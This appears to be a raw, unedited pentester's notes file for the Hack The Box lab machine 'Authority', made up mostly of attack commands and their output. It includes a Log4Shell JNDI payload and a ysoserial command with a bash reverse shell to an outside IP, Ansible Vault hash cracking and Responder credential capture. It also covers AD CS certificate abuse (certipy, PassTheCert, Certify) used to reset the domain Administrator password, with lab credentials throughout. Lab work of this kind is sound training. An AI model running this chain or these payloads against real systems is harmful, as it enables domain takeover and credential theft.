@@ -1,0 +1,723 @@
+Authority
+10.10.11.222
+
+svc_pwm
+pWm_@dm!N_!23
+
+svc_ldap
+DevT3st@123
+
+svc_ldap
+lDaP_1n_th3_cle4r!
+
+
+--------------------------------------------------------------------------------------------
+
+└─$ cat authority-nmap             
+# Nmap 7.94SVN scan initiated Thu Nov 30 00:06:35 2023 as: nmap -sCV -Pn -p- --open -o authority-nmap 10.10.11.222
+Nmap scan report for 10.10.11.222
+Host is up (0.076s latency).
+Not shown: 60464 closed tcp ports (conn-refused), 5043 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-30 09:07:07Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2023-11-30T09:08:14+00:00; +4h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+|_ssl-date: 2023-11-30T09:08:15+00:00; +3h59m59s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2023-11-30T09:08:16+00:00; +4h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+|_ssl-date: 2023-11-30T09:08:15+00:00; +4h00m00s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8443/tcp  open  ssl/https-alt
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 82
+|     Date: Thu, 30 Nov 2023 09:07:14 GMT
+|     Connection: close
+|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 82
+|     Date: Thu, 30 Nov 2023 09:07:13 GMT
+|     Connection: close
+|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET, HEAD, POST, OPTIONS
+|     Content-Length: 0
+|     Date: Thu, 30 Nov 2023 09:07:13 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 1936
+|     Date: Thu, 30 Nov 2023 09:07:20 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
+|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
+| ssl-cert: Subject: commonName=172.16.2.118
+| Not valid before: 2023-11-27T13:44:34
+|_Not valid after:  2025-11-29T01:22:58
+|_ssl-date: TLS randomness does not represent time
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49691/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+49694/tcp open  msrpc         Microsoft Windows RPC
+49702/tcp open  msrpc         Microsoft Windows RPC
+49704/tcp open  msrpc         Microsoft Windows RPC
+49713/tcp open  msrpc         Microsoft Windows RPC
+49733/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=11/30%Time=65681881%P=x86_64-pc-linu
+SF:x-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/ht
+SF:ml;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu,\x2030\x
+SF:20Nov\x202023\x2009:07:13\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\
+SF:n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm
+SF:'\"/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\
+SF:x20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x
+SF:20Thu,\x2030\x20Nov\x202023\x2009:07:13\x20GMT\r\nConnection:\x20close\
+SF:r\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:
+SF:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20T
+SF:hu,\x2030\x20Nov\x202023\x2009:07:14\x20GMT\r\nConnection:\x20close\r\n
+SF:\r\n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"
+SF:0;URL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x2
+SF:0\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20e
+SF:n\r\nContent-Length:\x201936\r\nDate:\x20Thu,\x2030\x20Nov\x202023\x200
+SF:9:07:20\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x
+SF:20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad
+SF:\x20Request</title><style\x20type=\"text/css\">body\x20{font-family:Tah
+SF:oma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgr
+SF:ound-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16p
+SF:x;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color
+SF::black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;
+SF:}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\
+SF:x20Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x
+SF:20Report</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x2
+SF:0the\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p>
+SF:<p><b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x
+SF:20process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20
+SF:perceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed
+SF:\x20request\x20syntax,\x20invalid\x20");
+Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-11-30T09:08:04
+|_  start_date: N/A
+|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Nov 30 00:08:16 2023 -- 1 IP address (1 host up) scanned in 101.18 seconds
+
+
+--------------------------------------------------------------------------------------------
+Common Name 172.16.2.118 ==> docker
+
+visual
+
+Directory unavailable. If this error occurs repeatedly please contact your help desk.
+
+CN=svc_pwm,CN=Users,DC=htb,DC=corp 
+
+PWM is currently in configuration mode. This mode allows updating the configuration without authenticating to an LDAP directory first. End user functionality is not available in this mode.
+
+After you have verified the LDAP directory settings, use the Configuration Manager to restrict the configuration to prevent unauthorized changes. After restricting, the configuration can still be changed but will require LDAP directory authentication first.
+
+5017 ERROR_DIRECTORY_UNAVAILABLE (all ldap profiles are unreachable; errors: ["error connecting as proxy user: unable to create connection: unable to connect to any configured ldap url, last error: unable to bind to ldaps://authority.authority.htb:636 as CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb reason: CommunicationException (authority.authority.htb:636; PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target)"])
+
+c:\pwm\PwmConfiguration.xml:
+
+PWM v2.0.3 bc96802e
+
+${jndi:ldap://10.10.16.72:1389/a}
+${jndi:ldap://127.0.0.1#10.10.16.72:1389/wwmtvk}
+
+
+java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
+
+java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L 10.10.16.72:1389 -P /tmp/cc5.ser
+
+${ldap://10.10.16.72:1389/wwmtvk}
+
+CN=svc_pwm,CN=Users,DC=htb,DC=corp 
+CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
+
+ldapsearch -x -H ldap://10.10.11.222 -b "DC=authority,DC=htb"
+ldapsearch -x -H ldap://10.10.11.222 -D '' -w '' -b "DC=htb,DC=corp"
+ldapsearch -H ldap://10.10.11.222 -D '' -w '' -b "DC=authority,DC=htb"
+
+authority.htb
+
+ldapsearch -H ldaps://10.10.11.222:636/ -x -s base -b '' "(objectClass=*)" "*" +
+ldapsearch -H ldaps://authority.htb:636/ -x -s base -b '' "(objectClass=*)" "*" +
+ldapsearch -H ldap://authority.htb:389/ -x -b "dc=authority,dc=htb"
+ldapsearch -h authority.htb -p 389 -x -b "dc=authority,dc=htb"
+
+authority.htb:authority$@AUTHORITY.HTB
+
+ldapsearch -H ldaps://10.10.11.222:636 -D 'authority.htb' -w 'authority' -b "DC=AUTHORITY,DC=HTB"
+
+ldapsearch -x -H ldap://authority.htb "uid=authority" -b "dc=authority,dc=htb"
+
+ldapsearch -H ldaps://authority.authority.htb:636 -x -s base -b "DC=AUTHORITY,DC=HTB,DC=corp"
+
+authority.htb.corp
+
+
+┌──(kali㉿kali)-[~/stuffs/htb/authority.htb]
+└─$ crackmapexec smb 10.10.11.222 -u "asd" -p "" --shares   
+SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\asd: 
+SMB         10.10.11.222    445    AUTHORITY        [+] Enumerated shares
+SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark
+SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------
+SMB         10.10.11.222    445    AUTHORITY        ADMIN$                          Remote Admin
+SMB         10.10.11.222    445    AUTHORITY        C$                              Default share
+SMB         10.10.11.222    445    AUTHORITY        Department Shares                 
+SMB         10.10.11.222    445    AUTHORITY        Development     READ            
+SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC
+SMB         10.10.11.222    445    AUTHORITY        NETLOGON                        Logon server share 
+SMB         10.10.11.222    445    AUTHORITY        SYSVOL                          Logon server share 
+
+smbclient -U 'asd' //10.10.11.222/Development
+mask "";recurse ON;prompt OFF;mget *
+
+remote_user = svc_pwm
+
+ansible_user: administrator 
+ansible_password: Welcome1
+ansible_port: 5985
+ansible_connection: winrm		==>> winrm ??
+ansible_winrm_transport: ntlm
+ansible_winrm_server_cert_validation: ignore   
+
+evil-winrm -u administrator -p Welcome1 -i 10.10.11.222
+
+
+Automation/Ansible/PWM/defaults 	==>> pwn credencial
+
+
+  description: PWM web service		==>> pwn version ??
+  license: GPLv2
+  min_ansible_version: 1.5
+
+<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
+<user username="robot" password="T0mc@tR00t" roles="manager-script"/>
+
+
+python3 -m pip install --user ansible
+
+
+echo '$ANSIBLE_VAULT;1.1;AES256
+30636561663762383436386639353737363431353033326634623639666132623738643764366530
+6332363635613832396361333634303135663735356134350a383265333537383739353864663136
+30393363653361373738656361613435626237643633383261663138653466393332333036353737
+3335396631613239380a616531626235346361333737353831376633633264326566623339663463
+6235' | /home/kali/.local/bin/ansible-vault decrypt /dev/stdin --output=/dev/stderr > /dev/null
+
+pwm_run_dir: "{{ lookup('env', 'PWD') }}"
+
+pwm_hostname: authority.htb.corp
+pwm_http_port: "{{ http_port }}"
+pwm_https_port: "{{ https_port }}"
+pwm_https_enable: true
+
+pwm_require_ssl: false
+
+pwm_admin_login: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          32666534386435366537653136663731633138616264323230383566333966346662313161326239
+          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+          35653634376333666234613466396534343030656165396464323564373334616262613439343033
+          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+          3438
+
+pwm_admin_password: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          31356338343963323063373435363261323563393235633365356134616261666433393263373736
+          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
+          38656432323830393339336231373637303535613636646561653637386634613862316638353530
+          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
+          6531
+
+ldap_uri: ldap://127.0.0.1/
+ldap_base_dn: "DC=authority,DC=htb"
+ldap_admin_password: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          63303831303534303266356462373731393561313363313038376166336536666232626461653630
+          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+          34646237336164356438383034623462323531316333623135383134656263663266653938333334
+          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+          3764    
+
+hashcat -m 16900 -O -a 0 -w 3 --session=vault ani seclists/Passwords/darkc0de.txt
+
+ANSIBLE_VAULT;1.1;AES256
+          63303831303534303266356462373731393561313363313038376166336536666232626461653630
+          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+          34646237336164356438383034623462323531316333623135383134656263663266653938333334
+          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+          3764
+
+
+ref: https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/
+
+ansible2john ansiblehash >> ansible2johnhash
+
+ansiblehash1:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
+ansiblehash2:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
+ansiblehash3:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
+
+!@#$%^&*
+
+$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
+
+hashcat -m 16900 -O -a 0 -w 4 ansible2johnhash /usr/share/wordlists/rockyou.txt
+
+echo '$ANSIBLE_VAULT;1.1;AES256
+63303831303534303266356462373731393561313363313038376166336536666232626461653630
+3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+34646237336164356438383034623462323531316333623135383134656263663266653938333334
+3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+3764' | /home/kali/.local/bin/ansible-vault decrypt && echo
+
+DevT3st@123
+
+echo '$ANSIBLE_VAULT;1.1;AES256
+32666534386435366537653136663731633138616264323230383566333966346662313161326239
+6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+35653634376333666234613466396534343030656165396464323564373334616262613439343033
+6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+3438' | /home/kali/.local/bin/ansible-vault decrypt && echo
+
+svc_pwm
+
+echo '$ANSIBLE_VAULT;1.1;AES256
+31356338343963323063373435363261323563393235633365356134616261666433393263373736
+3335616263326464633832376261306131303337653964350a363663623132353136346631396662
+38656432323830393339336231373637303535613636646561653637386634613862316638353530
+3930356637306461350a316466663037303037653761323565343338653934646533663365363035
+6531' | /home/kali/.local/bin/ansible-vault decrypt && echo
+
+pWm_@dm!N_!23
+
+https://authority.htb:8443/pwm/private/config/manager ==>> pWm_@dm!N_!23
+
+
+ldapsearch -x -H ldap://10.10.11.222 -D 'svc_ldap' -w 'DevT3st@123' -b "DC=authority,DC=htb"
+ldapsearch -x -H ldap://authority.htb -D 'svc_ldap' -w 'pWm_@dm\!N_\!23' -b "DC=authority,DC=htb"
+ldapsearch -x -H ldaps://authority.htb:636 -D 'svc_pwm' -w 'pWm_@dm\!N_\!23' -b "DC=authority,DC=htb"
+
+evil-winrm -u svc_ldap -p DevT3st@123 -i 10.10.11.222
+evil-winrm -u svc_pwm -p pWm_@dm!N_!23 -i 10.10.11.222
+
+crackmapexec smb 10.10.11.222 -u "svc_ldap" -p "DevT3st@123" --shares
+crackmapexec smb 10.10.11.222 -u "svc_pwm" -p "pWm_@dm\!N_\!23" --shares
+
+$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua
+ENC-PW:bpJ28EJLqUOHm3US7ArIgYVm9+5fDtKqwjLfWAnnjOh5W/6qGPRauAPpWdiGkZCQTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=
+ENC-PW:tKtsDry8qw2XrJ3OvI+QOKX+wZ8siC6sv264YIlA1rGYlqktFE7sVPGcnYE4ra44Kue/Um6dkZm1RrcECBHk358zc045rDyFL2fDku2kusl79NE+Tww8gC8QQ0CX+VS2yyD46+ZS6Jriyu1Y7BOXnJifXXXsHzTmBTkodvnY33V6Puc0Zze0PGYHN+CGFtx/g5WaBTQbQwZwNLA+8Qe11GqCz+rBjGzQp0w6yLHJn+ZYBlLWgvZwN2KUHOiUIq5eKKDgjv+mga4zcB1STcpMJRaIiSnLdY3VCfsEj6p4BGz9jj+N7gQHBFAvI05JexXq8HyL7ZUEzLXU5FMQXvhhWSbhxoz7LH/iamvoOg13WnI3MRUzrXv91Uh7gdNZuXa1NmSBOe/g1GgmFV+0sxLIJ/99VT+GHIwrfjPNNV6jtKHhURPwp0a38c6aBGjpvB3AgAoZ0/KVLvQK1pAevO4NK2XFF2nPD8gQCQJMCsb62I+XMitkO2zKytrYEwZhl9VUGF0bAXQhC5I9xX1tEQAGBcENt1NGfM8iE+PlrZWwlr1yDjw+GZEm2KHyjnUFpBubqD7l7mvEJbEV26SQkR0v4R5LSEPbElOKGbGXMKkDEi53SQ5P0ZZQbega9XtBOHs+/s1EZ4p/qGVCvpD9dgc0SyS0auXU0PUddjxyXthHdqRbEWHhAduXYQgXF0eM2yWlbd7fTgSUMERlpjdFX/QZG3D6Ghp+iOCwfelEfKMQDO1myQcpq5YTE94YDz+aSWvi7ZGRIq+hRkwuR8E0EbEUE7CApDwF3LjGi+UEd9Y3Q9SPSMVxg4Ra2FB4sYCT19N7KV3TpGvJYD4SE8Mrn0cH9ihvlvDJFOxoLC9xM8FA9EAvSZN1w6lV4pUsVpUSM0LRKLqCmBCRJvaRNbhRymM96NFSSi4PwCCJQ7WVJjiS+oLQ+7qwHhqLQFy0+gtkGSQnBoq1FMYSCyGz/fUG84Xe0CSTPt4SwTq+L2M2jqsiB+HXq1z2LdkAFo6xm1Mqs6H/x5ZP1esjvRxDzHod31jRizu+rJw4LNRb172A36dQWmiq/OJQBJrnPu87s+KmoNyCJGrT2+1QttMgM62qy2/Eb6xByQ8RiLl6v87vf24TuWhxJhXfNWMRuHXJp2IWt5BWAYdiQNUjCuvRhfiyxsIqelpEpsOnm8WDVEsN0hqaEt9Db2e/d3Wpx1as4luVtA/MZtKy+gsH0qZUmouj7LCfN5TJpm00MiBTxYSkapKvAGchkE4UVc3AHGIxeyy+t2LwqT9fDSlS/VofOELNcQD3OfPi+asOrgaqcRbZVXdQumoJsubLMiPpHTZtOH2Nt13cEh9ZG/XebrAkchsMjsyLo5KX0nL6RKbMNUA3BmM2cd+bjj+Jar2aeAeqBdW+LU5ALshAsF986N1BGSsQ8aZkJwLi3PUYG8vGR88ZqEMMziQ=
+
+
+localDB ????
+
+rpcclient --user domain\username%password ip
+rpcclient --user authority.htb\svc_ldap%DevT3st 10.10.11.222
+rpcclient --user authority.htb\svc_pwm%pWm_@dm!N_!23 10.10.11.222
+
+
+pWm_@dm!N_!23
+ldaps://authority.htb.corp:636
+
+ENC-PW:y/KCQpEfoXVTiHyPjXU2wmFm0X018NUUuim0LHZ9l6NIXbfxugA90emYT1zFIfA/TYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=
+
+
+
+
+**ref: return.htb (took me 1 day for this fck me)
+
+sudo responder -I tun0
+
+[LDAP] Cleartext Client   : 10.10.11.222
+[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
+[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
+[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
+
+
+evil-winrm -u svc_ldap -p lDaP_1n_th3_cle4r! -i 10.10.11.222
+
+
+
+
+
+--------------------------------------------------------------------------------------------
+
+evil-winrm -u svc_ldap -p lDaP_1n_th3_cle4r! -i 10.10.11.222
+
+
+impacket-GetNPUsers -dc-ip 10.10.11.222 -request -outputfile getnpuser authority.htb/svc_ldap:lDaP_1n_th3_cle4r!
+
+ldapsearch -x -H ldap://10.10.11.222 -D authority.htb/svc_ldap -w lDaP_1n_th3_cle4r! -b "DC=authority,DC=htb"
+ldapsearch -ZZ -d 5 -b 'cn=Users,dc=authority,dc=htb' -s sub -D 'cn=svc_ldap,cn=Users,dc=authority,dc=com' -H ldaps://10.10.11.222:636 -w 'lDaP_1n_th3_cle4r!' -x '(cn=svc_ldap)'
+
+ldapsearch -H ldap://10.10.11.222/ -x -b 'DC=authority,DC=htb' -D authority.htb/svc_ldap -w lDaP_1n_th3_cle4r!
+
+ldapsearch -x -H ldaps://10.10.11.222:636 -D 'svc_ldap' -w 'lDaP_1n_th3_cle4r!' -b "DC=authority,DC=htb"
+ldapsearch -x -H ldap://10.10.116.140 -D 'web_svc' -w 'Diamond1' -b "CN=USERS,DC=OSCP,DC=EXAM"
+
+** make ldapsearch work
+
+
+bloodhound-python -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -ns 10.10.11.222  -d authority.htb -c all --zip
+
+
+ldapsearch -x -H ldap://10.10.11.222 -D 'svc_ldap' -w 'lDaP_1n_th3_cle4r!' -b "DC=htb,DC=corp"
+ldapsearch -x -H 'ldap://10.10.11.222' -b "CN=Public Key Services,CN=Services,CN=Configuration, DC=authority,DC=htb,DC=corp" -D 'authority.htb.corp\svc_ldap' -w 'lDaP_1n_th3_cle4r!'
+
+
+ldapdomaindump -u 'authority.htb\svc_ldap' -p 'lDaP_1n_th3_cle4r!' -o /home/kali/stuffs/ -n 10.10.11.222 10.10.11.222
+
+impacket-psexec -dc-ip 10.10.11.222 "authority.htb/svc_ldap":"lDaP_1n_th3_cle4r\!"@"10.10.11.222" 
+impacket-GetADUsers -dc-ip 10.10.11.222 "authority.htb/svc_ldap":"lDaP_1n_th3_cle4r\!"@"10.10.11.222" 
+
+* https://exploit-notes.hdks.org/exploit/windows/active-directory/ad-cs-pentesting/
+
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc_ldap\Documents\ -OutputPrefix "authority-audit"
+
+
+get-childitem cert:\localmachine\my
+   PSParentPath: Microsoft.PowerShell.Security\Certificate::localmachine\my
+
+Thumbprint                                Subject
+----------                                -------
+790DCBD9D91E34EDE37CDAD9C114C3DE1BEBA7BE  CN=authority.authority.htb
+42A80DC79DD9CE76D032080B2F8B172BC29B0182  CN=AUTHORITY-CA, DC=authority, DC=htb
+
+$cert = Get-ChildItem -Path cert:\LocalMachine\My\790DCBD9D91E34EDE37CDAD9C114C3DE1BEBA7BE
+$cert1 = Get-ChildItem -Path cert:\LocalMachine\My\42A80DC79DD9CE76D032080B2F8B172BC29B0182
+Export-Certificate -Cert $cert -FilePath C:\Users\svc_ldap\Documents\test.cer
+Export-Certificate -Cert $cert1 -FilePath C:\Users\svc_ldap\Documents\test1.cer
+
+
+$pw = ConvertTo-SecureString "lDaP_1n_th3_cle4r!" -AsPlainText -Force 
+$certificate = Get-ChildItem cert:\LocalMachine\My\790DCBD9D91E34EDE37CDAD9C114C3DE1BEBA7BE
+Export-PfxCertificate -Cert $certificate -FilePath key.pfx -Password $pw
+$certificate = Get-ChildItem cert:\LocalMachine\My\42A80DC79DD9CE76D032080B2F8B172BC29B0182
+Export-PfxCertificate -Cert $certificate -FilePath key.pfx -Password $pw
+
+
+/home/kali/.local/bin/certipy find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222
+
+impacket-addcomputer -computer-name 'PC02' -computer-pass 'Password@123' -debug -method LDAPS -computer-group 'CN=Computers,DC=authority,DC=htb' -dc-ip 10.10.11.222 authority.htb/svc_ldap:lDaP_1n_th3_cle4r\!
+
+
+/home/kali/.local/bin/certipy req -username 'PC02$@authority.htb' -password 'Password@123' -ca AUTHORITY-CA -dc-ip 10.10.11.222 -target authority.authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -debug
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'authority.authority.htb' at '10.10.11.222'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 15
+[*] Got certificate with multiple identifications
+    UPN: 'administrator@authority.htb'
+    DNS Host Name: 'authority.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator_authority.pfx'
+
+
+/home/kali/.local/bin/certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222	==>> not work
+
+
+/home/kali/.local/bin/certipy cert -pfx administrator_authority.pfx -nokey -out administrator_authority.crt
+/home/kali/.local/bin/certipy cert -pfx administrator_authority.pfx -nocert -out administrator_authority.key
+
+
+
+
+python3 /home/kali/stuffs/tools/PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator_authority.crt -key administrator_authority.key -domain authority.htb -dc-ip 10.10.11.222 # ==>> ldapshell
+
+# change_password administrator Password@123
+Got User DN: CN=Administrator,CN=Users,DC=authority,DC=htb
+Attempting to set new password of: Password@123
+Password changed successfully!
+
+
+
+
+
+
+
+
+
+
+./Certify.exe find /vulnerable ==>> domain computer # ==>>domain computer can enroll -> create new computer
+
+. ./PowerMad.ps1
+New-MachineAccount -MachineAccount PC03 -Domain authority.htb -DomainController authority.authority.htb -Verbose ==>> faile because passowrd input
+
+$machine_account_password = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
+New-MachineAccount -MachineAccount PC03 -Password $machine_account_password -Domain authority.htb -DomainController authority.authority.htb -Verbose
+Verbose: [+] SAMAccountName = PC03$
+Verbose: [+] Distinguished Name = CN=PC03,CN=Computers,DC=authority,DC=htb
+[+] Machine account PC03 added
+Get-ADComputer "PC03" -Properties *
+
+./Certify.exe request /ca:authority.authority.htb\AUTHORITY-CA /template:CorpVPN
+
+./Certify.exe request /ca:authority.authority.htb\AUTHORITY-CA /template:CorpVPN /altname:administrator
